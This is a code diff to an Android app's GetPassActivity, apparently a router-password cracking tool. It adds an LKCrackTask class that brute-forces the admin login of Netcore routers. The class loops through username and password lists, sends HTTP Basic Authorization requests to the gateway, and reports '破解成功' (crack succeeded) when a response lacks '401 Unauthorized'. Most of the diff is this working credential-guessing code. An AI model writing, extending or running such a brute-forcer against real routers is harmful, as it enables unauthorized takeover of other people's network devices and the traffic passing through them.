@@ -17,6 +17,13 @@ import java.util.List;
 import java.util.Random;
 import java.util.concurrent.ExecutionException;
 
+import org.apache.http.HttpResponse;
+import org.apache.http.ParseException;
+import org.apache.http.client.ClientProtocolException;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.util.EntityUtils;
+
 import com.powerock.demo2.R;
 import com.powerock.hydra.RouterInfoActivity.SetRouterTypeTask;
 import com.powerock.hydra.common.BaseUtils;
@@ -119,6 +126,10 @@ public class GetPassActivity extends Activity {
 					
 							DCrackTask task = new DCrackTask();
 							task.execute(gateway, user.get(m), pass.get(n));
+				}else if(routerType.equals("netcore磊科")){
+					LKCrackTask task = new LKCrackTask();
+					task.execute(gateway, user.get(m), pass.get(n));
+					//task.execute(gateway, "guest", "guest");
 				}else{
 				
 						CrackTask task = new CrackTask();
@@ -293,11 +304,11 @@ public class GetPassActivity extends Activity {
 					e.printStackTrace();
 				}
 			}else if(!tag){
-				Toast.makeText(GetPassActivity.this, "破解成功", Toast.LENGTH_SHORT).show();
+				BaseUtils.customToast(GetPassActivity.this, "破解成功");
 			}else{
 				usernameView.setText("");
 				passView.setText("");
-				Toast.makeText(GetPassActivity.this, "破解失败", Toast.LENGTH_SHORT).show();
+				BaseUtils.customToast(GetPassActivity.this, "破解失败");
 			}
 			
 		}
@@ -459,6 +470,121 @@ public class GetPassActivity extends Activity {
 		}
 	}
 	
+	
+	
+	class LKCrackTask extends  AsyncTask<String, Integer, Boolean> {
+
+		@Override
+		protected Boolean doInBackground(String... arg0) {
+			byte[] passByte = (arg0[1] + ":" + arg0[2]).getBytes();
+
+			userpass = "Basic " + Base64.encodeToString(passByte, Base64.DEFAULT).replace(
+					"\n", "");
+			System.out.println("userpass:" + userpass);
+			String url = "http://" + gateway;
+			HttpGet httpGet = new HttpGet(url);
+			HttpResponse httpResponse = null;
+			httpGet.setHeader("Authorization", userpass);
+			httpGet.setHeader("User-Agent",
+					"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36");
+			httpGet.setHeader("Accept-Encoding", "gzip,deflate,sdch");
+			httpGet.setHeader("Accept",
+					"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+			try {
+				httpResponse = new DefaultHttpClient().execute(httpGet);
+			} catch (ClientProtocolException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+			
+			String result = null;
+			try {
+				result = EntityUtils.toString(httpResponse.getEntity(),
+						"Gb2312");
+			} catch (ParseException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			} catch (IOException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+			System.out.println("redult:" + result);
+			if(result.contains("401 Unauthorized"))
+				return false;
+			else
+				return true;
+		}
+		
+		@Override
+		protected void onPostExecute(Boolean result) {
+			// TODO Auto-generated method stub
+			super.onPostExecute(result);
+			if (result.toString().equals("true")) {
+				nextButton.setEnabled(true);
+				nextButton.setTextColor(Color.parseColor("#ffffff"));
+				tag = false;
+			} 
+			if(n==pass.size()-1 && tag){
+				m++;
+				n=0;
+				LKCrackTask task = new LKCrackTask();
+				try {
+					result = task.execute(gateway, user.get(m), pass.get(n)).get();
+					usernameView.setText(user.get(m));
+					passView.setText(pass.get(n));
+					viewContent = "";
+					for (int i = 0; i < PASS_NUMBER; i++)
+						viewContent = viewContent + getCharacterAndNumber()
+								+ " ";
+					passImageView.setText(viewContent);
+					System.out.println("result:" + result);
+					System.out.println("user[i], pass[j]:" + user.get(m)
+							+ "    " + pass.get(n));
+					System.out.println("usernameView:"
+							+ usernameView.getText());
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} catch (ExecutionException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}else if(n < pass.size() && m < user.size() && tag){
+				n++;
+				LKCrackTask task = new LKCrackTask();
+				try {
+					result = task.execute(gateway, user.get(m), pass.get(n)).get();
+					usernameView.setText(user.get(m));
+					passView.setText(pass.get(n));
+					viewContent = "";
+					for (int i = 0; i < PASS_NUMBER; i++)
+						viewContent = viewContent + getCharacterAndNumber()
+								+ " ";
+					passImageView.setText(viewContent);
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} catch (ExecutionException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+			}else if(!tag){
+				BaseUtils.customToast(GetPassActivity.this, "破解成功");
+			}else{
+				usernameView.setText("");
+				passView.setText("");
+				BaseUtils.customToast(GetPassActivity.this, "破解失败");
+			}
+			
+		}
+		
+		protected void onProgressUpdate(Integer... values){
+			
+		}
+	}
 	
 	
 	private String getCharacterAndNumber() {
